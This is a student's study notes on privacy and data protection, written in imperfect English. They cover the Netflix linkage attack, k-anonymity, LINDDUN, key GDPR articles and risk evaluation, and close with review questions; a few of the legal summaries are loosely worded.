A big data leak was the one when Netflix asking for a better raccomandation algorithm releasead a dataset. This dataset was not containing personal informations, but the university of Texas was anyway able to relate some of this data to the reviews in the website IMDB.

This attack is called **linkage attack** and consist of linking data from different dataset so that it's possible to identify a user.  

A mitigation for this attack is to make the **quasi-identifiers** (that are piece of informations that are not unique themself) difficult to distinguish with **k-anonimity**. K-anonmity is the rule that says an information cannot be distinguished from at least k-1 individuals.

![K-anonimity table](https://i.imgur.com/U7qSmw0.png)

### Linddun

**Linddun** characterization of privacy are the rules:

- **Linkability** that indicates the possibility to correlate 2 items of initerest
- **Identifiability** that indicates the possibility to identify a user
- **Non-repudiation** indicates that is not possible to deny a caim
- **Detectability** detect if a user exsist or not
- **Disclosure of information** is the violation of confidentiality
- **Unawareness** is not being aware of the consequences of sharing informations
- **Non-compliance** means not being compliant with legislation

### GDPR

**General Data Protection Regulation** (GDPR) covers all EU citizens and it includes:

- getting informations of a user without it's express consent
- notifying people in 72 hours when a data breach is released
- large businesses need to have an officer that is responsible for the compliance of the company
- fines reach €20 million or 4% of the previous fiscal year worldwide turnover
- performing Data Protection Impact Assessment for every data processing activity

One important article is the article 4 with various definitions.

- **Personal data** means data reated to an identity and identifiable as a natural person
- **Processing** means any operation that is performed on a personal data
- **Pseudonymisation** means to process a data in a way that personal data can no longer be attributed to a specific subject
- **Controller** is the entity that control the processing of infotmations
- **Processor** is the legal person which processes the personal data on behalf of the controller
- **Consent** means that the data are freely given to a specific subject
- **Personal data breach** means a breach of personal informations

The **condition for consent** (article 7) states that the controller shall be able to demonstrate that a certain user has given the permission of processing his/her data. This consent needs to be presented in a manner which is clearly distinguishable from the other metters. The data subject shall have the right to withdraw his or the consent in any time.

The **security of processing** (article 32) states that the technical and organizational measures to ensure a level of security appropiate to the risk needs to be calculated.

The **notification of a personal data breach to the supervisory authority** (article 33) states that in the case of a personal data breach shall without delay inform the make aware the users of the data breach.

**Communication of a personal data breach to the data bubject** (article 34) in which it's likely to result in a high rish to the rights and freedom of a natural person needs to be communicated immediatly without delay.

The **data protection impact assessment** (article 35) states that with the new technologies the controller shall, prior to the processing, carry out an assessment of the impact to the risk of the rights and dreedoms of data subjects.

### Risk evaluation

The **problem the risk evaluation** is the accuracy of mesurments, and problems can raise, for example it's difficult to tell the percentage if fullt patched systems and the inconsistrency of mesurment methods can raise, for example the patch status of an application can be different from app to app.

The **definition of risk** is:  
[likelihood of adverse event] x [impact of the adverse event]

Stochastic models can be used to evaluate the likelihood of an adverse event, and metrics from available vulnerability databases can be used to evaluate the impact of an event.

![Risk matrix](https://i.imgur.com/ebvOP1U.png)

### Privacy and data protection questions

- What is the likelihood of an event? What is the impact of an event?
  - What is the risk of an event?
  - What is the risk matrix?
- Define the notion of privacy. What is k-anonimity?
- What is data protection? What is LINDDUN?
- What is the scope of application of the GDPR? Who is the data controller?
  - Who is the data processort?
  - What is the Data Protection Impact Assessment?
  - Why does the GDPR propose a risk-based approach to data protection?
- What is the difference between the risk evaluated for an organization and the risk of a data processing activity in the GDPR?
